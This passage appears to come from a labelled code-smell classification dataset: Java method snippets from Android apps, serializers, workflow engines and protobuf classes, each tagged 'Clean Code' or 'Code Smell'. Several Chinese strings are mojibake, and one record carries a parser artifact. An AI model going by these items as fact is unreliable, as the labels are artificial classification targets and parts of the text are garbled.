  return new MySQLMetadataDAO(retryTemplate,objectMapper,dataSource,properties);
}
",0,Clean Code
"@TargetApi(Build.VERSION_CODES.JELLY_BEAN) public static IjkMediaCodecInfo setupCandidate(MediaCodecInfo codecInfo,String mimeType){
  if (codecInfo == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN)   return null;
  String name=codecInfo.getName();
  if (TextUtils.isEmpty(name))   return null;
  name=name.toLowerCase(Locale.US);
  int rank=RANK_NO_SENSE;
  if (!name.startsWith(""omx."")) {
    rank=RANK_NON_STANDARD;
  }
 else   if (name.startsWith(""omx.pv"")) {
    rank=RANK_SOFTWARE;
  }
 else   if (name.startsWith(""omx.google."")) {
    rank=RANK_SOFTWARE;
  }
 else   if (name.startsWith(""omx.ffmpeg."")) {
    rank=RANK_SOFTWARE;
  }
 else   if (name.startsWith(""omx.k3.ffmpeg."")) {
    rank=RANK_SOFTWARE;
  }
 else   if (name.startsWith(""omx.avcodec."")) {
    rank=RANK_SOFTWARE;
  }
 else   if (name.startsWith(""omx.ittiam."")) {
    rank=RANK_NO_SENSE;
  }
 else   if (name.startsWith(""omx.mtk."")) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2)     rank=RANK_NO_SENSE;
 else     rank=RANK_TESTED;
  }
 else {
    Integer knownRank=getKnownCodecList().get(name);
    if (knownRank != null) {
      rank=knownRank;
    }
 else {
      try {
        CodecCapabilities cap=codecInfo.getCapabilitiesForType(mimeType);
        if (cap != null)         rank=RANK_ACCEPTABLE;
 else         rank=RANK_LAST_CHANCE;
      }
 catch (      Throwable e) {
        rank=RANK_LAST_CHANCE;
      }
    }
  }
  IjkMediaCodecInfo candidate=new IjkMediaCodecInfo();
  candidate.mCodecInfo=codecInfo;
  candidate.mRank=rank;
  candidate.mMimeType=mimeType;
  return candidate;
}",0,Clean Code
"@Override public void run(){
  boolean suc;
  suc=runMiniCap(""libs"");
  String man=iDevice.getProperty(IDevice.PROP_DEVICE_MANUFACTURER);
  if (man == null) {
    return;
  }
  if (!suc && iDevice != null && (man.equals(""Xiaomi"") || man.equals(""deltainno"") || man.equals(""HUAWEI""))) {
    suc=runMiniCap(""Xiaomi"");
    if (!suc && iDevice != null) {
      suc=runMiniCap(""Xiaomi_NW"");
      if (!suc && iDevice != null) {
        suc=runMiniCap(""Xiaomi_One"");
      }
    }
  }
  if (!suc && iDevice != null && man.equals(""vivo"")) {
    suc=runMiniCap(""vivo"");
  }
  if (!suc && iDevice != null && man.equals(""LGE"")) {
    suc=runMiniCap(""LGE"");
  }
  if (session != null && (!suc)) {
    JSONObject support=new JSONObject();
    support.put(""msg"",""support"");
    support.put(""text"",""璇ヨ澶囦笉鍏煎MiniCap鎶曞睆锛�"");
    BytesTool.sendText(session,support.toJSONString());
  }
}
",0,Clean Code
"/** 
 * Constructs a new duration with the given value and unit  {@link DurationUnit#SECONDS}. 
 */
public static Duration ofSeconds(double value){
  return new Duration(value,SECONDS);
}
",0,Clean Code
"/** 
 * Terminate workflow execution, and then remove it from the system. Acts as terminate and remove combined.
 * @param workflowId WorkflowId of the workflow
 * @param reason Reason for terminating the workflow.
 * @param archiveWorkflow Archives the workflow and associated tasks instead of removing them.
 */
public void terminateRemove(String workflowId,String reason,boolean archiveWorkflow){
  workflowExecutor.terminateWorkflow(workflowId,reason);
  executionService.removeWorkflow(workflowId,archiveWorkflow);
}
",0,Clean Code
"/** 
 * 鎵ц鏃跺嚭鐜板紓甯�, 鍦ㄦ鎹曡幏骞剁粺涓�澶勭悊
 * @param request   request
 * @param response  response
 * @param exception ex
 */
protected void onAuthenticationFailure(ServletRequest request,ServletResponse response,Exception exception) throws IOException {
  HttpServletResponse resp=(HttpServletResponse)response;
  resp.setContentType(""application/json;charset=utf-8"");
  resp.setStatus(200);
  PrintWriter out=resp.getWriter();
  IRCode authCode=RCode.INTERNAL_SERVER_ERROR;
  if (exception instanceof AuthException) {
    authCode=AuthRCode.getByCode(((AuthException)exception).getCode());
  }
  printStackTrace(authCode,exception);
  R<Object> apiResult=R.fault(authCode.getCode(),authCode.getMsg(),exception.getMessage());
  String resultJson=JsonUtil.toJson(apiResult);
  out.write(resultJson);
  out.flush();
  out.close();
}",0,Clean Code
"@Benchmark public Object fury_deserializeInts(FuryState.ReadIntsState state){
  state.buffer.readerIndex(0);
  return state.fury.deserialize(state.buffer);
}",0,Clean Code
"@Override public void write(MemoryBuffer buffer,Map<String,T> value){
  buffer.writeVarUint32Small7(value.size());
  for (  Map.Entry<String,T> e : value.entrySet()) {
    fury.writeJavaStringRef(buffer,e.getKey());
    fury.writeRef(buffer,e.getValue());
  }
}",0,Clean Code
"private DoGachaCsReq(){
}
",0,Clean Code
"public String convertExpression(Filter.Expression expression);
",0,Clean Code
"@Override public void init(){
  hookAllMethods(""com.android.camera.data.data.runing.DataItemRunning"",""supportHandGesture"",new BaseHook.MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      param.setResult(true);
    }
  }
);
}
",0,Clean Code
"private boolean isModuleConfigValid(ModuleConfig module){
  if (module == null) {
    LOGGER.error(""module should not be null!"");
    return false;
  }
  if (module.getMd5() == null) {
    LOGGER.error(""module md5 should not be null!"");
    return false;
  }
  if (module.getName() == null) {
    LOGGER.error(""module name should not be null!"");
    return false;
  }
  if (module.getVersion() == null) {
    LOGGER.error(""module version should not be null!"");
    return false;
  }
  if (module.getInstallCommand() == null) {
    LOGGER.error(""module install cmd should not be null!"");
    return false;
  }
  if (module.getStartCommand() == null) {
    LOGGER.error(""module start cmd should not be null!"");
    return false;
  }
  if (module.getStopCommand() == null) {
    LOGGER.error(""module stop cmd should not be null!"");
    return false;
  }
  if (module.getCheckCommand() == null) {
    LOGGER.error(""module check cmd should not be null!"");
    return false;
  }
  if (!isPackageConfigValid(module.getPackageConfig())) {
    return false;
  }
  return true;
}",0,Clean Code
"public EvaluatorSettings getSettings(){
  return evaluatorSettings;
}
",0,Clean Code
"@Override protected void before(MethodHookParam param) throws Throwable {
  param.setResult(true);
}
",0,Clean Code
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (metadata_ != null) {
    output.writeMessage(1,getMetadata());
  }
  if (getForwardFeatureMappingList().size() > 0) {
    output.writeUInt32NoTag(18);
    output.writeUInt32NoTag(forwardFeatureMappingMemoizedSerializedSize);
  }
  for (int i=0; i < forwardFeatureMapping_.size(); i++) {
    output.writeInt32NoTag(forwardFeatureMapping_.getInt(i));
  }
  if (getBackwardFeatureMappingList().size() > 0) {
    output.writeUInt32NoTag(26);
    output.writeUInt32NoTag(backwardFeatureMappingMemoizedSerializedSize);
  }
  for (int i=0; i < backwardFeatureMapping_.size(); i++) {
    output.writeInt32NoTag(backwardFeatureMapping_.getInt(i));
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(modelDirectory_)) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,4,modelDirectory_);
  }
  if (featureConverter_ != null) {
    output.writeMessage(5,getFeatureConverter());
  }
  if (outputConverter_ != null) {
    output.writeMessage(6,getOutputConverter());
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(outputName_)) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,7,outputName_);
  }
  unknownFields.writeTo(output);
}",0,Clean Code
"/** 
 * <code>repeated .DisplayAvatarDetailInfo display_avatar_list = 13;</code>
 * @return whether the displayAvatarList field is set
 */
public boolean hasDisplayAvatarList(){
  return (bitField0_ & 0x00000400) != 0;
}",0,Clean Code
"@Override public int getMicState(){
  return this.mUserDevState.getMicState();
}
",0,Clean Code
"@Override public byte[] convert(Collection<Object> value,ValueMapper valueMapper){
  var result=new byte[value.size()];
  var i=0;
  for (  Object elem : value) {
    if (!cachedElementType.isExactClassOf(elem)) {
      cachedElementType=PClassInfo.forValue(elem);
      cachedConverter=valueMapper.getConverter(cachedElementType,byte.class);
    }
    assert cachedConverter != null;
    result[i++]=cachedConverter.convert(elem,valueMapper);
  }
  return result;
}",0,Clean Code
"public static String serviceTaskFinish(String bizId){
  return RpcUtil.request(""com.alipay.adtask.biz.mobilegw.service.task.finish"",""[{\""bizId\"":\"""" + bizId + ""\""}]"");
}
",0,Clean Code
"public void prepare(){
  Graph graph=getClassGraph();
  Map<String,GetterOrSetterMethod> temp=new HashMap<>();
  for (Iterator<Map.Entry<String,GetterOrSetterMethod>> it=gettersAndSetters.entrySet().iterator(); it.hasNext(); ) {
    Map.Entry<String,GetterOrSetterMethod> entry=it.next();
    GetterOrSetterMethod method=entry.getValue();
    RefFieldEntity target=method.getTarget();
    try {
      if (isShouldSkipInline(graph,method,target)) {
        throw new ShouldSkipInlineException(""Method is override method."");
      }
      FieldEntity origin=target.origin();
      FieldEntity realField=graph.confirmOriginField(origin.className(),origin.name(),origin.desc());
      if (realField == null) {
        throw new RuntimeException(""Can not resolve real field:"" + origin.className() + "" ""+ origin.desc()+ "" ""+ origin.name());
      }
      if (graph.get(realField.className()).entity.fromAndroid) {
        throw new ShouldSkipInlineException(""Target class is in android.jar."");
      }
 else {
        if (!origin.equals(realField)) {
          RefFieldEntity realRefField=new RefFieldEntity(realField);
          realRefField.setCount(target.getCount());
          method.setTarget(realRefField);
          RefFieldEntity refFieldEntity=targetFields.get(getKey(realField.className(),realField.name(),realField.desc()));
          if (refFieldEntity != null) {
            refFieldEntity.setCount(refFieldEntity.getCount() + target.getCount());
          }
 else {
            targetFields.put(getKey(realField.className(),realField.name(),realField.desc()),realRefField);
          }
          target.setCount(0);
          targetFields.remove(getKey(target.className(),target.name(),target.desc()));
        }
      }
      if (proguardConfigurationAnalyzer.shouldKeep(getTransformContext().getVariantName(),graph,method.getMethodInfo())) {
        throw new ShouldSkipInlineException(""The class and method are kept by Proguard."");
      }
      graph.childrenOf(method.className()).forEach(c -> temp.putIfAbsent(getKey(c.entity.name,method.name(),method.desc()),method));
    }
 catch (    ShouldSkipInlineException e) {
      it.remove();
      target.dec();
      if (target.isFree()) {
        targetFields.remove(getKey(target.className(),target.name(),target.desc()));
      }
      getLogger().d(""ShouldSkipInline"",String.format(""Skip inline getter or setter method (owner = [%s], name = [%s], desc = [%s])"",method.className(),method.name(),method.desc()));
    }
  }
  gettersAndSetters.putAll(temp);
}",0,Clean Code
"/** 
 * <code>optional uint32 uid = 5;</code>
 * @param value the uid to set
 * @return this
 */
public PlayerDetailInfo setUid(final int value){
  bitField0_|=0x00000001;
  uid=value;
  return this;
}",0,Clean Code
"public static boolean isInternalUri(Uri uri,boolean[] forceBrowser){
  return isInternalUri(uri,false,forceBrowser);
}
public static boolean isInternalUri(Uri uri,boolean all,boolean[] forceBrowser){
  String host=AndroidUtilities.getHostAuthority(uri);
  host=host != null ? host.toLowerCase() : """";
  if (MessagesController.getInstance(UserConfig.selectedAccount).authDomains.contains(host)) {
    if (forceBrowser != null) {
      forceBrowser[0]=true;
    }
    return false;
  }
  Matcher prefixMatcher=LaunchActivity.PREFIX_T_ME_PATTERN.matcher(host);
  if (prefixMatcher.find()) {
    uri=Uri.parse(""https://t.me/"" + prefixMatcher.group(1) + (TextUtils.isEmpty(uri.getPath()) ? """" : ""/"" + uri.getPath())+ (TextUtils.isEmpty(uri.getQuery()) ? """" : ""?"" + uri.getQuery()));
    host=uri.getHost();
    host=host != null ? host.toLowerCase() : """";
  }
  if (""ton"".equals(uri.getScheme())) {
    try {
      Intent viewIntent=new Intent(Intent.ACTION_VIEW,uri);
      List<ResolveInfo> allActivities=ApplicationLoader.applicationContext.getPackageManager().queryIntentActivities(viewIntent,0);
      if (allActivities != null && allActivities.size() >= 1) {
        return false;
      }
    }
 catch (    Exception ignore) {
    }
    return true;
  }
 else   if (""tg"".equals(uri.getScheme()) || ""vmess"".equals(uri.getScheme()) || ""vmesss1"".equals(uri.getScheme())|| ""ss"".equals(uri.getScheme())|| ""ssr"".equals(uri.getScheme())|| ""ws"".equals(uri.getScheme())|| ""wss"".equals(uri.getScheme())|| ""trojan"".equals(uri.getScheme())) {
    return true;
  }
 else   if (""telegram.dog"".equals(host)) {
    String path=uri.getPath();
    if (path != null && path.length() > 1) {
      if (all) {
        return true;
      }
      path=path.substring(1).toLowerCase();
      if (path.startsWith(""blog"") || path.equals(""iv"") || path.startsWith(""faq"")|| path.equals(""apps"")|| path.startsWith(""s/"")) {
        if (forceBrowser != null) {
          forceBrowser[0]=true;
        }
        return false;
      }
      return true;
    }
  }
 else   if (""telegram.me"".equals(host) || ""t.me"".equals(host)) {
    String path=uri.getPath();
    if (path != null && path.length() > 1) {
      if (all) {
        return true;
      }
      path=path.substring(1).toLowerCase();
      if (path.equals(""iv"") || path.startsWith(""s/"")) {
        if (forceBrowser != null) {
          forceBrowser[0]=true;
        }
        return false;
      }
      return true;
    }
  }
 else   if (all) {
    if (host.endsWith(""telegram.org"") || host.endsWith(""telegra.ph"") || host.endsWith(""telesco.pe"")) {
      return true;
    }
  }
  return false;
}",1,Code Smell
"/** 
 * Execute a shell command in a foreground  {@link TermuxSession}. 
 */
private void executeTermuxSessionCommand(ExecutionCommand executionCommand){
  if (executionCommand == null)   return;
  Logger.logDebug(LOG_TAG,""Executing foreground \"""" + executionCommand.getCommandIdAndLabelLogString() + ""\"" TermuxSession command"");
  if (executionCommand.shellName == null && executionCommand.executable != null)   executionCommand.shellName=ShellUtils.getExecutableBasename(executionCommand.executable);
  TermuxSession newTermuxSession=null;
  ShellCreateMode shellCreateMode=processShellCreateMode(executionCommand);
  if (shellCreateMode == null)   return;
  if (ShellCreateMode.NO_SHELL_WITH_NAME.equals(shellCreateMode)) {
    newTermuxSession=getTermuxSessionForShellName(executionCommand.shellName);
    if (newTermuxSession != null)     Logger.logVerbose(LOG_TAG,""Existing TermuxSession with \"""" + executionCommand.shellName + ""\"" shell name found for shell create mode \""""+ shellCreateMode.getMode()+ ""\"""");
 else     Logger.logVerbose(LOG_TAG,""No existing TermuxSession with \"""" + executionCommand.shellName + ""\"" shell name found for shell create mode \""""+ shellCreateMode.getMode()+ ""\"""");
  }
  if (newTermuxSession == null)   newTermuxSession=createTermuxSession(executionCommand);
  if (newTermuxSession == null)   return;
  handleSessionAction(DataUtils.getIntFromString(executionCommand.sessionAction,TERMUX_SERVICE.VALUE_EXTRA_SESSION_ACTION_SWITCH_TO_NEW_SESSION_AND_OPEN_ACTIVITY),newTermuxSession.getTerminalSession());
}
",0,Clean Code
"public AnthropicToolResultContent(String toolUseId,String content,Boolean isError){
  super(""tool_result"");
  this.toolUseId=toolUseId;
  this.content=content;
  this.isError=isError;
}
",0,Clean Code
"@Override public IStateAction<CNodeDraggedLeftState<NodeType,EdgeType>> createNodeDraggedLeftAction(){
  return new SingleGraphNodeDraggedLeftAction<>();
}
",0,Clean Code
"/** 
 * <code>repeated .ItemCost item_list = 13;</code>
 * @return this
 */
public PromoteAvatarCsReq clearItemList(){
  bitField0_&=~0x00000002;
  itemList.clear();
  return this;
}",0,Clean Code
"/** 
 * @deprecated Used only for JSON serialization and deserialization.
 */
@JsonProperty(""inputData"") @Deprecated public void setRawInputData(Map<String,Object> inputData){
  setInputData(inputData);
}
",0,Clean Code
"@Test void should_build_webSearchTool(){
  String searchTerm=""Any text to search"";
  WebSearchTool webSearchTool=WebSearchTool.from(webSearchEngine);
  String strResult=webSearchTool.searchWeb(searchTerm);
  assertThat(strResult).isNotBlank();
  assertThat(strResult).as(""At least one result should be contains 'title 1' and 'https://google.com' and 'content 1'"").contains(""Title: title 1\nSource: https://google.com\nContent:\ncontent 1"");
  verify(webSearchEngine).search(searchTerm);
  verifyNoMoreInteractions(webSearchEngine);
}",0,Clean Code
"@Override public void onPlayStateChanged(int playState){
switch (playState) {
case VideoView.STATE_IDLE:
    release();
  break;
case VideoView.STATE_PREPARING:
if (!isPrepared()) {
  prepare(mParser,mContext);
}
break;
case VideoView.STATE_PLAYING:
Log.i(""test"",""isPrepared():"" + isPrepared() + isPaused());
if (isPrepared() && isPaused()) {
resume();
}
break;
case VideoView.STATE_PAUSED:
if (isPrepared()) {
pause();
}
break;
case VideoView.STATE_PLAYBACK_COMPLETED:
break;
}
}
",0,Clean Code
"@Override public long getUserTinyId(){
  return this.mInfo.getUserTinyId();
}
",0,Clean Code
"/** 
 * 淇敼淇濆瓨鍙傛暟鏍￠獙
 * @param genTable 涓氬姟淇℃伅
 */
@Override public void validateEdit(GenTable genTable){
  if (GenConstants.TPL_TREE.equals(genTable.getTplCategory())) {
    String options=JSON.toJSONString(genTable.getParams());
    JSONObject paramsObj=JSON.parseObject(options);
    if (StringUtils.isEmpty(paramsObj.getString(GenConstants.TREE_CODE))) {
      throw new ServiceException(""鏍戠紪鐮佸瓧娈典笉鑳戒负绌�"");
    }
 else     if (StringUtils.isEmpty(paramsObj.getString(GenConstants.TREE_PARENT_CODE))) {
      throw new ServiceException(""鏍戠埗缂栫爜瀛楁涓嶈兘涓虹┖"");
    }
 else     if (StringUtils.isEmpty(paramsObj.getString(GenConstants.TREE_NAME))) {
      throw new ServiceException(""鏍戝悕绉板瓧娈典笉鑳戒负绌�"");
    }
 else     if (GenConstants.TPL_SUB.equals(genTable.getTplCategory())) {
      if (StringUtils.isEmpty(genTable.getSubTableName())) {
        throw new ServiceException(""鍏宠仈瀛愯〃鐨勮〃鍚嶄笉鑳戒负绌�"");
      }
 else       if (StringUtils.isEmpty(genTable.getSubTableFkName())) {
        throw new ServiceException(""瀛愯〃鍏宠仈鐨勫閿悕涓嶈兘涓虹┖"");
      }
    }
  }
}
",0,Clean Code
"@Override public RawBasicBlock getTarget(){
  return super.getTarget();
}
",0,Clean Code
"private void checkForExpiredNotifications(){
  checkForExpiredNotifications=null;
  if (this.allowedNotifications.size() == 0) {
    return;
  }
  long minTime=Long.MAX_VALUE;
  long currentTime=SystemClock.elapsedRealtime();
  ArrayList<Integer> expiredIndices=null;
  for (int i=0; i < allowedNotifications.size(); i++) {
    AllowedNotifications allowedNotification=allowedNotifications.valueAt(i);
    if (currentTime - allowedNotification.time > 1000) {
      if (expiredIndices == null) {
        expiredIndices=new ArrayList<>();
      }
      expiredIndices.add(allowedNotifications.keyAt(i));
    }
 else {
      minTime=Math.min(allowedNotification.time,minTime);
    }
  }
  if (expiredIndices != null) {
    for (int i=0; i < expiredIndices.size(); i++) {
      onAnimationFinish(expiredIndices.get(i));
    }
  }
  if (minTime != Long.MAX_VALUE) {
    long time=EXPIRE_NOTIFICATIONS_TIME - (currentTime - minTime);
    AndroidUtilities.runOnUIThread(() -> checkForExpiredNotifications=this::checkForExpiredNotifications,Math.max(17,time));
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 sender_uid = 9;</code>
 * @return this
 */
public GetPrivateChatHistoryCsReq clearSenderUid(){
  bitField0_&=~0x00000002;
  senderUid=0;
  return this;
}",0,Clean Code
"@Override public ArrayList<IGProPAInstructionInfo> getInstructions(){
  ArrayList<GProPAInstructionInfo> instructions=this.mInfo.getInstructions();
  ArrayList<IGProPAInstructionInfo> arrayList=new ArrayList<>();
  Iterator<GProPAInstructionInfo> it=instructions.iterator();
  while (it.hasNext()) {
    arrayList.add(new GGProPAInstructionInfo(it.next()));
  }
  return arrayList;
}
",0,Clean Code
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (parentIdx_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(1,parentIdx_);
  }
  if (curIdx_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(2,curIdx_);
  }
  if (greaterThanIdx_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(3,greaterThanIdx_);
  }
  if (lessThanOrEqualIdx_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(4,lessThanOrEqualIdx_);
  }
  if (splitFeatureIdx_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(5,splitFeatureIdx_);
  }
  if (java.lang.Double.doubleToRawLongBits(splitValue_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(6,splitValue_);
  }
  if (java.lang.Double.doubleToRawLongBits(impurity_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeDoubleSize(7,impurity_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",0,Clean Code
"private int continueReadVarUint32(int readIdx,int bulkRead,int value){
  readIdx++;
  value|=(bulkRead >>> 2) & 0x1fc000;
  if ((bulkRead & 0x800000) != 0) {
    readIdx++;
    value|=(bulkRead >>> 3) & 0xfe00000;
    if ((bulkRead & 0x80000000) != 0) {
      value|=(UNSAFE.getByte(heapMemory,address + readIdx++) & 0x7F) << 28;
    }
  }
  readerIndex=readIdx;
  return value;
}",0,Clean Code
"public static String formatDistance(float distance,int type){
  return formatDistance(distance,type,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6d54b39f",0,Clean Code
"@Override public RogueCommonBuffSelectResult clone(){
  return new RogueCommonBuffSelectResult().copyFrom(this);
}
",0,Clean Code
"/** 
 * <code>repeated .RelicAffix sub_affix_list = 4;</code>
 * @return this
 */
public BattleRelic clearSubAffixList(){
  bitField0_&=~0x00000010;
  subAffixList.clear();
  return this;
}",0,Clean Code
"/** 
 * Weaviate consistencyLevel.
 * @param consistencyLevel consistencyLevel to use.
 * @return this builder.
 */
public Builder withConsistencyLevel(ConsistentLevel consistencyLevel){
  Assert.notNull(consistencyLevel,""The consistencyLevel can not be null."");
  this.consistencyLevel=consistencyLevel;
  return this;
}
",0,Clean Code
"@Override public void onViewCreated(@NonNull View view,@Nullable Bundle savedInstanceState){
  super.onViewCreated(view,savedInstanceState);
  RecyclerView recyclerView=view.findViewById(moralnorm.preference.R.id.recycler_view);
  ViewCompat.setOnApplyWindowInsetsListener(recyclerView,new OnApplyWindowInsetsListener(){
    @NonNull @Override public WindowInsetsCompat onApplyWindowInsets(    @NonNull View v,    @NonNull WindowInsetsCompat insets){
      Insets inset=Insets.max(insets.getInsets(WindowInsetsCompat.Type.systemBars()),insets.getInsets(WindowInsetsCompat.Type.displayCutout()));
      v.setPadding(inset.left,0,inset.right,inset.bottom + dp2px(requireContext(),56.5F) + sp2px(requireContext(),12));
      return insets;
    }
  }
);
}",0,Clean Code
"@ParameterizedTest @ValueSource(strings={""{\""arg0\"": 2, \""arg1\"": "" + Double.MAX_VALUE + ""}"",""{\""arg0\"": 2, \""arg1\"": "" + -Double.MAX_VALUE + ""}""}) void should_fail_when_argument_does_not_fit_into_byte_type(String arguments) throws NoSuchMethodException {
  executeAndExpectFailure(arguments,""bytes"",byte.class,Byte.class,""Argument \""arg1\"" is out of range for java.lang.Byte:"");
}",0,Clean Code
"@Override public ChessRogueNousDiceInfo copyFrom(final ChessRogueNousDiceInfo other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    diceBranchId=other.diceBranchId;
    questionDifficulty=other.questionDifficulty;
    maxDifficulty=other.maxDifficulty;
    diceSurface.copyFrom(other.diceSurface);
  }
  return this;
}",0,Clean Code
"private void toggleAllFlexboxChildren(FlexboxLayout mFlexboxLibs){
  boolean isAllChecked=true;
  for (int i=0; i < mFlexboxLibs.getChildCount(); i+=1) {
    View child=mFlexboxLibs.getChildAt(i);
    if (child instanceof RoundCheckboxWithText) {
      if (!((RoundCheckboxWithText)child).isEnabled()) {
        continue;
      }
      if (!((RoundCheckboxWithText)child).isChecked()) {
        isAllChecked=false;
        break;
      }
    }
  }
  for (int i=0; i < mFlexboxLibs.getChildCount(); i+=1) {
    View child=mFlexboxLibs.getChildAt(i);
    if (child instanceof RoundCheckboxWithText) {
      if (!((RoundCheckboxWithText)child).isEnabled()) {
        continue;
      }
      ((RoundCheckboxWithText)child).setChecked(!isAllChecked);
    }
  }
}",0,Clean Code
"@Override public PlayerDisplaySettings clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"@Override public void onDoubleTapProgressUp(float posX,float posY){
  if (PlayerActivity.locked)   return;
  if (player == null || player.getMediaItemCount() < 1 || player.getCurrentPosition() < 0 || playerView == null || playerView.getWidth() < 0)   return;
  long current=player.getCurrentPosition();
  if (posX < playerView.getWidth() * 0.35 && current <= 500)   return;
  if (posX > playerView.getWidth() * 0.65 && current >= (player.getDuration() - 500))   return;
  if (getVisibility() != View.VISIBLE) {
    if (posX < playerView.getWidth() * 0.35 || posX > playerView.getWidth() * 0.65) {
      if (performListener != null)       performListener.onAnimationStart();
      SecondsView secondsView=findViewById(R.id.seconds_view);
      secondsView.setVisibility(View.VISIBLE);
      secondsView.start();
    }
 else     return;
  }
  if (posX < playerView.getWidth() * 0.35) {
    SecondsView secondsView=findViewById(R.id.seconds_view);
    if (secondsView.isForward()) {
      changeConstraints(false);
      secondsView.setForward(false);
      secondsView.setSeconds(0);
    }
    ((CircleClipTapView)findViewById(R.id.circle_clip_tap_view)).resetAnimation(new Runnable(){
      @Override public void run(){
        ((CircleClipTapView)findViewById(R.id.circle_clip_tap_view)).updatePosition(posX,posY);
      }
    }
);
    rewinding();
  }
 else   if (posX > playerView.getWidth() * 0.65) {
    SecondsView secondsView=findViewById(R.id.seconds_view);
    if (!secondsView.isForward()) {
      changeConstraints(true);
      secondsView.setForward(true);
      secondsView.setSeconds(0);
    }
    ((CircleClipTapView)findViewById(R.id.circle_clip_tap_view)).resetAnimation(new Runnable(){
      @Override public void run(){
        ((CircleClipTapView)findViewById(R.id.circle_clip_tap_view)).updatePosition(posX,posY);
      }
    }
);
    forwarding();
  }
 else {
  }
}",0,Clean Code
"/** 
 * Returns the Y coordinate of the node in a view.
 * @return The Y coordinate of the node.
 */
double getY();
",0,Clean Code
"private static Schema applyAddColumnEvent(AddColumnEvent event,Schema oldSchema){
  LinkedList<Column> columns=new LinkedList<>(oldSchema.getColumns());
  for (  AddColumnEvent.ColumnWithPosition columnWithPosition : event.getAddedColumns()) {
switch (columnWithPosition.getPosition()) {
case FIRST:
{
        columns.addFirst(columnWithPosition.getAddColumn());
        break;
      }
case LAST:
{
      columns.addLast(columnWithPosition.getAddColumn());
      break;
    }
case BEFORE:
{
    Preconditions.checkNotNull(columnWithPosition.getExistedColumnName(),""existedColumnName could not be null in BEFORE type AddColumnEvent"");
    List<String> columnNames=columns.stream().map(Column::getName).collect(Collectors.toList());
    int index=columnNames.indexOf(columnWithPosition.getExistedColumnName());
    if (index < 0) {
      throw new IllegalArgumentException(columnWithPosition.getExistedColumnName() + "" of AddColumnEvent is not existed"");
    }
    columns.add(index,columnWithPosition.getAddColumn());
    break;
  }
case AFTER:
{
  Preconditions.checkNotNull(columnWithPosition.getExistedColumnName(),""existedColumnName could not be null in AFTER type AddColumnEvent"");
  List<String> columnNames=columns.stream().map(Column::getName).collect(Collectors.toList());
  int index=columnNames.indexOf(columnWithPosition.getExistedColumnName());
  if (index < 0) {
    throw new IllegalArgumentException(columnWithPosition.getExistedColumnName() + "" of AddColumnEvent is not existed"");
  }
  columns.add(index + 1,columnWithPosition.getAddColumn());
  break;
}
}
}
return oldSchema.copy(columns);
}",0,Clean Code
"@Override public VmClass getVmClass(){
  return BaseModule.getDynamicClass();
}
",0,Clean Code
"public static Source createSource(ModuleKey moduleKey,String text){
  return Source.newBuilder(""pkl"",text,moduleKey.getUri().toString()).mimeType(VmLanguage.MIME_TYPE).uri(moduleKey.getUri()).cached(false).build();
}
",0,Clean Code
"@Subscribe public void openWallets(OpenWalletsEvent event){
  if (event.getWalletTabDataList().isEmpty()) {
    List<WalletTabData> closedTabData=walletWindows.remove(event.getWindow());
    if (closedTabData != null && !closedTabData.isEmpty()) {
      EventManager.get().post(new WalletTabsClosedEvent(closedTabData));
    }
  }
 else {
    walletWindows.put(event.getWindow(),event.getWalletTabDataList());
  }
  List<WalletTabData> allWallets=walletWindows.values().stream().flatMap(Collection::stream).collect(Collectors.toList());
  Platform.runLater(() -> {
    if (!Window.getWindows().isEmpty()) {
      List<File> walletFiles=allWallets.stream().filter(walletTabData -> walletTabData.getWallet().getMasterWallet() == null).map(walletTabData -> walletTabData.getStorage().getWalletFile()).filter(File::exists).collect(Collectors.toList());
      Config.get().setRecentWalletFiles(Config.get().isLoadRecentWallets() ? walletFiles : Collections.emptyList());
    }
  }
);
  boolean usbWallet=false;
  for (  WalletTabData walletTabData : allWallets) {
    Wallet wallet=walletTabData.getWallet();
    Storage storage=walletTabData.getStorage();
    if (Interface.get() == Interface.DESKTOP && (!storage.getWalletFile().exists() || wallet.containsSource(KeystoreSource.HW_USB) || CardApi.isReaderAvailable())) {
      usbWallet=true;
      if (deviceEnumerateService == null) {
        deviceEnumerateService=createDeviceEnumerateService();
      }
      if (deviceEnumerateService.getState() == Worker.State.CANCELLED) {
        deviceEnumerateService.reset();
      }
      if (!deviceEnumerateService.isRunning()) {
        deviceEnumerateService.start();
      }
      break;
    }
  }
  if (!usbWallet && deviceEnumerateService != null && deviceEnumerateService.isRunning()) {
    deviceEnumerateService.cancel();
    EventManager.get().post(new UsbDeviceEvent(Collections.emptyList()));
  }
}
",0,Clean Code
"@Override public PropRogueInfo clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  siteId=0;
  roomId=0;
  return this;
}",0,Clean Code
"@Override public RogueAeon clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"@Override public void onSharedPreferenceChanged(SharedPreferences sharedPreferences,String key){
  setSharedPreferenceChanged();
}
",0,Clean Code
"void drawBendsChanged(GraphSettings settings);
",0,Clean Code
"public Map<ComponentInfo,Integer> getAllComponents(){
